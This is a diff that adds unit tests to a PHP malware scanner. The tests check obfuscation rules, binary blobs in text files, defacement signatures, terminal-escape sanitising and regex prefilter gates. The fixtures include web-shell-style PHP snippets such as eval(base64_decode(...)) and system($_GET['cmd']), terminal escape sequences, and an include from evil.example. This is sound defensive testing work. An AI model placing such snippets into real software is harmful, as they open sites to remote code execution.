@@ -1,7 +1,10 @@
 #include <gtest/gtest.h>
 #include "rules/Registry.hpp"
+#include <re2/re2.h>
 #include "config/Types.h"
 #include "core/MatchEngine.h"
+#include "core/LiteralPrefilter.h"
+#include "utils/SafeText.h"
 
 using namespace lyxbosa::rules;
 using namespace lyxbosa;
@@ -672,4 +675,493 @@ TEST_F(StringAssemblyTest, IgnoresInterpolatedStrings) {
         "$c = \"$a\" . \"{$b}\";\n";
 
     EXPECT_TRUE(notesFor(content, "OBF024").empty());
+}
+
+// ============================================================================
+// OBF036 - Binary payload inside a file that declares itself as text
+// ============================================================================
+
+class BinaryInTextTest : public ::testing::Test {
+protected:
+    // The analyzer sees content only; the extension gate lives in MatchEngine.
+    bool fires(std::string_view content) {
+        const auto* rule = getRuleByCode("OBF036");
+        EXPECT_NE(rule, nullptr);
+        if (!rule) return false;
+        return !rule->findMatches(content).empty();
+    }
+
+    // A .php that carries an encrypted stage ahead of its source, as seen in
+    // live-cleanup-batch3-quarantine/55e69bc987921bd7.php
+    std::string blobThenPhp() {
+        std::string s;
+        for (int i = 0; i < 400; ++i) {
+            s.push_back(static_cast<char>(1 + (i % 8)));   // C0 controls
+            s.push_back(static_cast<char>('A' + (i % 26)));
+        }
+        s += "<?php goto vSHrlRg; $x = 1; ?>";
+        return s;
+    }
+
+    bool gatedFor(std::string_view path, std::string_view content) {
+        MatchContext ctx;
+        ctx.content = content;
+        ctx.filePath = path;
+        ctx.matchOffset = 0;
+        ctx.matchLine = 1;
+        ctx.matchColumn = 1;
+        ctx.matchedText = content.substr(0, 1);
+        return MatchEngine::applyContextFilter("OBF036", ctx);
+    }
+};
+
+TEST_F(BinaryInTextTest, FlagsBinaryBlobPrependedToSource) {
+    EXPECT_TRUE(fires(blobThenPhp()));
+}
+
+TEST_F(BinaryInTextTest, IgnoresOrdinarySource) {
+    EXPECT_FALSE(fires("<?php\n$a = 1;\nfunction f() { return 2; }\n"));
+}
+
+// The whole point of measuring C0 controls rather than "non-ASCII": UTF-8 text in
+// any script must score zero. A rule that counted high bytes would flag every
+// translation file in the tree.
+TEST_F(BinaryInTextTest, IgnoresUtf8InEveryScript) {
+    const char* samples[] = {
+        "<?php // Καλωσορίσατε στο ξενοδοχείο μας, τιμές και κρατήσεις\n",
+        "<?php // 日本語のテキストです。プラグイン設定を変更してください。\n",
+        "<?php // 这是一个中文测试文件，用于验证编码处理是否正确。\n",
+        "<?php // 한국어 텍스트입니다. 워드프레스 플러그인 설정.\n",
+        "<?php // مرحبا بكم في موقعنا. هذا نص تجريبي باللغة العربية.\n",
+        "<?php // שלום וברוכים הבאים לאתר שלנו. זהו טקסט לדוגמה.\n",
+        "<?php // Это тестовый файл на русском языке для проверки.\n",
+        "<?php // นี่คือข้อความภาษาไทยสำหรับทดสอบการเข้ารหัส\n",
+        "<?php // यह एक हिंदी परीक्षण फ़ाइल है।\n",
+        "<?php // Status: done, progress 100% \xF0\x9F\x8E\x89\xF0\x9F\x94\xA5\xE2\x9A\xA1\n",
+        "<?php // \xF0\x9F\x91\xA8\xE2\x80\x8D\xF0\x9F\x91\xA9\xE2\x80\x8D\xF0\x9F\x91\xA7 ZWJ family\n",
+        "<?php // \xE2\x94\x8C\xE2\x94\x80\xE2\x94\xAC\xE2\x94\x80\xE2\x94\x90 box drawing\n",
+    };
+    for (const auto* s : samples) {
+        EXPECT_FALSE(fires(s)) << "UTF-8 text must never be read as a binary payload: " << s;
+    }
+}
+
+// UTF-16 source is half NUL bytes by construction and must be exempted, or every
+// UTF-16 file in a tree becomes a critical finding.
+TEST_F(BinaryInTextTest, IgnoresUtf16WithBom) {
+    std::string utf16le = "\xFF\xFE";
+    const char* ascii = "<?php $a = 1; function f() { return 2; }";
+    for (const char* p = ascii; *p; ++p) { utf16le.push_back(*p); utf16le.push_back('\0'); }
+    EXPECT_FALSE(fires(utf16le));
+}
+
+TEST_F(BinaryInTextTest, IgnoresUtf16WithoutBom) {
+    std::string utf16le;
+    const char* ascii = "<?php $a = 1; function f() { return 2; } // padding text here";
+    for (const char* p = ascii; *p; ++p) { utf16le.push_back(*p); utf16le.push_back('\0'); }
+    EXPECT_FALSE(fires(utf16le));
+}
+
+TEST_F(BinaryInTextTest, IgnoresShortFiles) {
+    EXPECT_FALSE(fires(std::string("\x01\x02\x03\x04", 4)));
+}
+
+// Extension gate: binary in .php is anomalous, binary in .png is the file format.
+TEST_F(BinaryInTextTest, GateAcceptsTextExtensions) {
+    auto blob = blobThenPhp();
+    EXPECT_TRUE(gatedFor("/var/www/html/wp-content/cache/x.php", blob));
+    EXPECT_TRUE(gatedFor("/var/www/html/assets/app.js", blob));
+    EXPECT_TRUE(gatedFor("/var/www/html/index.HTML", blob));
+}
+
+TEST_F(BinaryInTextTest, GateRejectsBinaryFormats) {
+    auto blob = blobThenPhp();
+    EXPECT_FALSE(gatedFor("/var/www/html/img/logo.png", blob));
+    EXPECT_FALSE(gatedFor("/var/www/html/fonts/inter.woff2", blob));
+    EXPECT_FALSE(gatedFor("/var/www/html/media/clip.mp4", blob));
+    EXPECT_FALSE(gatedFor("/var/www/html/backup.zip", blob));
+}
+
+TEST_F(BinaryInTextTest, GateRejectsKnownBinaryBearingText) {
+    auto blob = blobThenPhp();
+    // Wordfence keeps WAF state as binary inside .php under wflogs/
+    EXPECT_FALSE(gatedFor("/var/www/wp-content/wflogs/attack-data.php", blob));
+    // SQL dumps legitimately carry BLOB literals
+    EXPECT_FALSE(gatedFor("/var/www/backup/dump.sql", blob));
+}
+
+// ============================================================================
+// DEFC001 - defacement signature must not fire on ordinary English prose
+// ============================================================================
+
+TEST(DefacementContextTest, IgnoresProseAfterHackedBy) {
+    auto gate = [](std::string_view matched) {
+        MatchContext ctx;
+        ctx.content = matched;
+        ctx.filePath = "/var/www/wp-content/plugins/wordfence/readme.txt";
+        ctx.matchOffset = 0;
+        ctx.matchLine = 1;
+        ctx.matchColumn = 1;
+        ctx.matchedText = matched;
+        return MatchEngine::applyContextFilter("DEFC001", ctx);
+    };
+
+    // Wordfence readme.txt: "stops you from getting hacked by identifying malicious traffic"
+    EXPECT_FALSE(gate("hacked by identifying"));
+    EXPECT_FALSE(gate("hacked by exploiting"));
+    EXPECT_FALSE(gate("Hacked By The"));
+
+    // A real defacement names a handle
+    EXPECT_TRUE(gate("Hacked By 7x1337"));
+    EXPECT_TRUE(gate("hacked by MrX"));
+}
+
+// ============================================================================
+// Untrusted output - findings quote malware, so nothing quoted may reach the
+// terminal as a command. See utils/SafeText.h.
+// ============================================================================
+
+TEST(SafeTextTest, EscapesTerminalControlSequences) {
+    using namespace lyxbosa::safe_text;
+
+    // DA1: the terminal answers this on stdin, and the answer ends up typed at
+    // the user's next shell prompt.
+    EXPECT_EQ(sanitize("A\x1b[c" "B"), "A\\x1b[cB");
+    // OSC 52 writes the analyst's clipboard.
+    EXPECT_EQ(sanitize("\x1b]52;c;aGk=\x07"), "\\x1b]52;c;aGk=\\x07");
+    EXPECT_EQ(sanitize(std::string("nul\0here", 8)), "nul\\x00here");
+    EXPECT_EQ(sanitize("del\x7f"), "del\\x7f");
+}
+
+TEST(SafeTextTest, LeavesUtf8Alone) {
+    using namespace lyxbosa::safe_text;
+
+    // Same rule as OBF036: bytes >= 0x80 are UTF-8, not control codes. Mangling
+    // them would wreck every finding quoted from a non-English file.
+    for (std::string_view s : {"Καλωσορίσατε", "日本語のテキスト", "Это тест",
+                               "مرحبا بكم", "\xF0\x9F\x8E\x89"}) {
+        EXPECT_EQ(sanitize(s), std::string(s)) << s;
+        EXPECT_FALSE(needsSanitizing(s)) << s;
+    }
+}
+
+TEST(SafeTextTest, TruncationCannotLeaveADanglingEscape) {
+    using namespace lyxbosa::safe_text;
+
+    // The original bug: a quote cut at a fixed byte length could end in "\033["
+    // and be completed by whatever was printed next.
+    std::string in(40, 'A');
+    in += "\x1b[";
+    for (size_t limit = 8; limit < 60; ++limit) {
+        std::string out = sanitizeAndTruncate(in, limit);
+        EXPECT_EQ(out.find('\x1b'), std::string::npos) << "raw ESC survived at limit " << limit;
+        // and never half of the "\xNN" we wrote in its place
+        auto tail = out.size() >= 3 ? out.substr(out.size() - 3) : out;
+        if (tail == "...") {
+            std::string body = out.substr(0, out.size() - 3);
+            auto bs = body.find_last_of('\\');
+            if (bs != std::string::npos) {
+                EXPECT_TRUE(body.size() - bs == 4 || body.find("\\x", bs) != bs)
+                    << "half an escape left at limit " << limit;
+            }
+        }
+    }
+}
+
+TEST(SafeTextTest, NeedsSanitizingDetectsOnlyControls) {
+    using namespace lyxbosa::safe_text;
+    EXPECT_FALSE(needsSanitizing("plain ascii ~!@#$%^&*()"));
+    EXPECT_TRUE(needsSanitizing("has\x1b" "esc"));
+    EXPECT_TRUE(needsSanitizing("has\ttab"));
+}
+
+// ============================================================================
+// OBF015 / OBF037 - evasions found in ir-quarantine-20260831b/aa0243e75b010ee3.php
+// ============================================================================
+
+class GotoAndEscapeTest : public ::testing::Test {
+protected:
+    bool fires(const char* code, const char* content) {
+        const auto* rule = getRuleByCode(code);
+        EXPECT_NE(rule, nullptr);
+        return rule && !rule->findMatches(content).empty();
+    }
+};
+
+// The emitter puts no space after the semicolon; the rule used to require one.
+TEST_F(GotoAndEscapeTest, GotoLabelNeedsNoWhitespaceAfterSemicolon) {
+    EXPECT_TRUE(fires("OBF015", "<?php goto kPpzye;LQL4spRSOK: tQtVYGj1();goto NGPmYI;wQEDHkCO: $a=1;"));
+    // still fires with a space, as before
+    EXPECT_TRUE(fires("OBF015", "<?php goto kPpzye; LQL4spRSOK: $a=1;"));
+}
+
+// ALL_CAPS labels are how humans write the one legitimate use of goto.
+TEST_F(GotoAndEscapeTest, GotoIgnoresUppercaseLabels) {
+    EXPECT_FALSE(fires("OBF015", "<?php goto SCANNER_TOP;SCANNER_TOP: $a=1;"));
+}
+
+// Interleaving the two notations slipped between the octal-only and hex-only rules.
+TEST_F(GotoAndEscapeTest, FlagsInterleavedOctalAndHexEscapes) {
+    EXPECT_TRUE(fires("OBF037",
+        "<?php echo \"\\74\\144\\x69\\166\\x3e\\x3c\\x69\\156\\160\\165\\x74\\x20\\x74\\171\";"));
+}
+
+// One convention throughout is what hand-written code looks like - binary constants
+// in getID3, phpseclib and minified JS do this all day and must stay silent.
+TEST_F(GotoAndEscapeTest, IgnoresSingleStyleEscapeRuns) {
+    EXPECT_FALSE(fires("OBF037",
+        "<?php $x = \"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\";"));
+    EXPECT_FALSE(fires("OBF037",
+        "<?php $x = \"\\101\\102\\103\\104\\105\\106\\107\\110\\111\\112\\113\\114\";"));
+}
+
+TEST_F(GotoAndEscapeTest, IgnoresShortMixedRuns) {
+    EXPECT_FALSE(fires("OBF037", "<?php $x = \"\\x41\\102\\x43\";"));
+}
+
+// ============================================================================
+// Every builtin pattern must actually compile.
+//
+// PatternCache::get() returns nullptr when RE2 rejects a pattern, and both
+// matches() and findMatches() skip a null quietly - so a syntax error does not
+// fail the build or the scan, it silently disables the rule. That is the worst
+// possible failure mode for a scanner, and it is exactly the risk taken on by
+// rewriting 90 patterns to wrap builtin names in (?i:...).
+// ============================================================================
+
+TEST(BuiltinPatternTest, EveryPatternCompiles) {
+    size_t checked = 0;
+
+    for (const auto* rule : getAllBuiltinRules()) {
+        ASSERT_NE(rule, nullptr);
+        for (const auto& pattern : rule->patterns) {
+            RE2::Options opts;
+            opts.set_log_errors(false);
+            opts.set_case_sensitive(!pattern.case_insensitive);
+            opts.set_dot_nl(true);
+            RE2 re(std::string(pattern.regex), opts);
+
+            EXPECT_TRUE(re.ok())
+                << rule->code.toString() << " (" << rule->name << ") has an invalid pattern:\n"
+                << "  " << pattern.regex << "\n"
+                << "  RE2: " << re.error();
+            ++checked;
+        }
+    }
+
+    EXPECT_GT(checked, 100u) << "expected the full builtin pattern set to be walked";
+}
+
+// RE2 must actually honour the inline flag the rewrite depends on. If this ever
+// stops holding, every (?i:...) rule degrades to case-sensitive silently.
+TEST(BuiltinPatternTest, Re2SupportsInlineCaseInsensitiveGroups) {
+    RE2::Options opts;
+    opts.set_log_errors(false);
+    RE2 re(R"((?i:eval)\s*\(\s*(?i:base64_decode)\s*\()", opts);
+
+    ASSERT_TRUE(re.ok()) << re.error();
+    EXPECT_TRUE(RE2::PartialMatch("eval(base64_decode(", re));
+    EXPECT_TRUE(RE2::PartialMatch("EvAl(BaSe64_DeCoDe(", re));
+    EXPECT_TRUE(RE2::PartialMatch("EVAL(BASE64_DECODE(", re));
+    // the scope of the flag must not leak past its group
+    RE2 scoped(R"((?i:eval)\(X\))", opts);
+    ASSERT_TRUE(scoped.ok()) << scoped.error();
+    EXPECT_TRUE(RE2::PartialMatch("EVAL(X)", scoped));
+    EXPECT_FALSE(RE2::PartialMatch("EVAL(x)", scoped));
+}
+
+// PHP resolves function names case-insensitively, so these all execute.
+TEST(BuiltinPatternTest, CaseVariantsOfBuiltinsStillMatch) {
+    struct Case { const char* code; const char* content; };
+    const Case cases[] = {
+        {"RCE001", "<?php EvAl(BaSe64_DeCoDe(\"AAAA\"));"},
+        {"RCE001", "<?php EVAL(BASE64_DECODE(\"AAAA\"));"},
+        {"RCE005", "<?php AsSeRt($_POST[\"x\"]);"},
+        {"RCE008", "<?php SySTeM($_GET[\"cmd\"]);"},
+        {"EXP006", "<?php UnSerialize($_COOKIE[\"c\"]);"},
+        {"WS008",  "<?php Move_Uploaded_File($f, $_GET[\"d\"]);"},
+    };
+
+    for (const auto& c : cases) {
+        const auto* rule = getRuleByCode(c.code);
+        ASSERT_NE(rule, nullptr) << c.code;
+        EXPECT_TRUE(rule->matches(c.content))
+            << c.code << " missed a case variant: " << c.content;
+    }
+}
+
+// ============================================================================
+// Literal gates
+//
+// A gate says "this pattern cannot match a file without these substrings", and
+// the engine uses it to skip work. If a gate is wrong the pattern is silently
+// never run on files it should have matched - a missed detection that produces
+// no error anywhere. These tests exist because that failure is invisible.
+// ============================================================================
+
+class LiteralGateTest : public ::testing::Test {
+protected:
+    // Two text projections of a pattern. A gate literal has to show up in one of
+    // them; this is a sanity check on the declaration, not a proof of requiredness
+    // (that is what the corpus differential against the previous binary is for).
+    //
+    //   1. escapes resolved  - finds contiguous literals: "base64_decode"
+    //   2. group syntax also removed - finds distributed ones: "$_get" inside
+    //      "\$_(GET|POST|REQUEST)", which is spelled across a group boundary
+    static bool appearsInAnyExpansion(std::string_view rx, const std::string& literal) {
+        std::string flat;
+        for (size_t i = 0; i < rx.size(); ++i) {
+            if (rx[i] == '\\' && i + 1 < rx.size()) {
+                // An escaped letter or digit is a class (\s \w \d \n \x41);
+                // escaped punctuation stands for itself (\$ \{ \( \. \|).
+                const char n = rx[i + 1];
+                if (!std::isalnum(static_cast<unsigned char>(n))) flat += n;
+                ++i;
+                continue;
+            }
+            flat += rx[i];
+        }
+        std::transform(flat.begin(), flat.end(), flat.begin(),
+                       [](unsigned char c) { return static_cast<char>(std::tolower(c)); });
+        if (flat.find(literal) != std::string::npos) return true;
+
+        // 3. prefix distributed over a group's alternatives, which is how
+        //    "\$_(GET|POST|REQUEST)" spells $_get, $_post and $_request.
+        for (size_t open = flat.find('('); open != std::string::npos;
+             open = flat.find('(', open + 1)) {
+            const size_t close = flat.find(')', open);
+            if (close == std::string::npos) break;
+            const std::string body = flat.substr(open + 1, close - open - 1);
+            if (body.find('(') != std::string::npos) continue;   // nested, skip
+            if (body.find('|') == std::string::npos) continue;   // not an alternation
+
+            // the literal run immediately before the group
+            size_t p = open;
+            while (p > 0) {
+                const char c = flat[p - 1];
+                if (std::isalnum(static_cast<unsigned char>(c)) || c == '_' || c == '$') --p;
+                else break;
+            }
+            const std::string prefix = flat.substr(p, open - p);
+
+            size_t start = 0;
+            while (start <= body.size()) {
+                const size_t bar = body.find('|', start);
+                const size_t end = (bar == std::string::npos) ? body.size() : bar;
+                if ((prefix + body.substr(start, end - start)).find(literal) != std::string::npos) {
+                    return true;
+                }
+                if (bar == std::string::npos) break;
+                start = bar + 1;
+            }
+        }
+
+        std::string collapsed;
+        for (size_t i = 0; i < flat.size(); ++i) {
+            if (flat.compare(i, 4, "(?i:") == 0) { i += 3; continue; }
+            if (flat.compare(i, 3, "(?:") == 0) { i += 2; continue; }
+            const char c = flat[i];
+            if (c == '(' || c == ')' || c == '|') continue;
+            collapsed += c;
+        }
+        return collapsed.find(literal) != std::string::npos;
+    }
+};
+
+// Catches the failure that actually happened while building this: gates generated
+// in one order and applied in another, so every literal guarded the wrong rule.
+// A gate literal must at minimum be text that appears in the pattern it guards.
+TEST_F(LiteralGateTest, EveryGateLiteralAppearsInThePatternItGuards) {
+    size_t checked = 0;
+    for (const auto* rule : getAllBuiltinRules()) {
+        for (const auto& pattern : rule->patterns) {
+
+            for (const auto& entry : pattern.gate) {
+                if (entry.empty()) continue;
+                // an entry is alternatives separated by '|'; each must appear
+                size_t start = 0;
+                while (start <= entry.size()) {
+                    const size_t bar = entry.find('|', start);
+                    const size_t end = (bar == std::string_view::npos) ? entry.size() : bar;
+                    const std::string alt(entry.substr(start, end - start));
+                    if (!alt.empty()) {
+                        ++checked;
+                        EXPECT_TRUE(appearsInAnyExpansion(pattern.regex, alt))
+                            << rule->code.toString() << " (" << rule->name << ")\n"
+                            << "  gate literal : " << alt << "\n"
+                            << "  pattern      : " << pattern.regex;
+                    }
+                    if (bar == std::string_view::npos) break;
+                    start = bar + 1;
+                }
+            }
+        }
+    }
+    EXPECT_GT(checked, 100u) << "expected the gated pattern set to be walked";
+}
+
+// A gated pattern must still fire on text it is supposed to match. These are the
+// techniques the gates most affect; if a gate is over-specified this fails.
+TEST_F(LiteralGateTest, GatedRulesStillMatchTheirTechnique) {
+    struct Case { const char* code; const char* content; };
+    const Case cases[] = {
+        {"RCE001", "<?php eval(base64_decode(\"AAAA\"));"},
+        {"RCE001", "<?php EvAl( BaSe64_DeCoDe (\"AAAA\"));"},
+        {"RCE002", "<?php eval(gzinflate(\"x\"));"},
+        {"RCE004", "<?php eval($_GET['x']);"},
+        {"RCE005", "<?php assert($_POST['x']);"},
+        {"RCE008", "<?php system($_GET['cmd']);"},
+        {"RCE008", "<?php passthru($_REQUEST['c']);"},
+        {"EXP006", "<?php unserialize($_COOKIE['c']);"},
+        {"EXP007", "<?php unlink($_GET['f']);"},
+        {"WS008",  "<?php move_uploaded_file($a, $_POST['d']);"},
+        {"BD012",  "<?php file_put_contents($f, $_POST['data']);"},
+        {"OBF009", "<?php base64_decode(base64_decode($x));"},
+        {"DRP005", "<?php include('https://evil.example/x.txt');"},
+    };
+    for (const auto& c : cases) {
+        const auto* rule = getRuleByCode(c.code);
+        ASSERT_NE(rule, nullptr) << c.code;
+        EXPECT_TRUE(rule->matches(c.content)) << c.code << " on: " << c.content;
+    }
+}
+
+// The prefilter's own semantics: AND across entries, OR inside one, case folded.
+TEST_F(LiteralGateTest, PrefilterSemantics) {
+    using lyxbosa::LiteralPrefilter;
+
+    rules::Pattern both{R"(x)", "", false, {"alpha", "beta"}};
+    rules::Pattern either{R"(x)", "", false, {"gamma|delta"}};
+    rules::Pattern none{R"(x)", "", false, {}};
+
+    LiteralPrefilter pf;
+    const size_t hBoth = pf.add(both);
+    const size_t hEither = pf.add(either);
+    const size_t hNone = pf.add(none);
+    ASSERT_TRUE(pf.compile());
+    EXPECT_EQ(hNone, LiteralPrefilter::kAlwaysRun);
+
+    auto present = pf.scan("nothing relevant here");
+    EXPECT_FALSE(pf.allows(hBoth, present));
+    EXPECT_FALSE(pf.allows(hEither, present));
+    EXPECT_TRUE(pf.allows(hNone, present));
+
+    present = pf.scan("only ALPHA is here");   // AND not satisfied
+    EXPECT_FALSE(pf.allows(hBoth, present));
+
+    present = pf.scan("Alpha and BETA both");  // case-insensitive
+    EXPECT_TRUE(pf.allows(hBoth, present));
+
+    present = pf.scan("just DELTA");           // OR satisfied by one alternative
+    EXPECT_TRUE(pf.allows(hEither, present));
+}
+
+// An unusable prefilter must fall back to running everything, never to skipping.
+TEST_F(LiteralGateTest, EmptyPrefilterAllowsEverything) {
+    using lyxbosa::LiteralPrefilter;
+    LiteralPrefilter pf;
+    rules::Pattern p{R"(x)", "", false, {"needle"}};
+    const size_t h = pf.add(p);
+    // compile() never called: scan returns empty, which means "run everything"
+    EXPECT_TRUE(pf.allows(h, LiteralPrefilter::Present{}));
 }
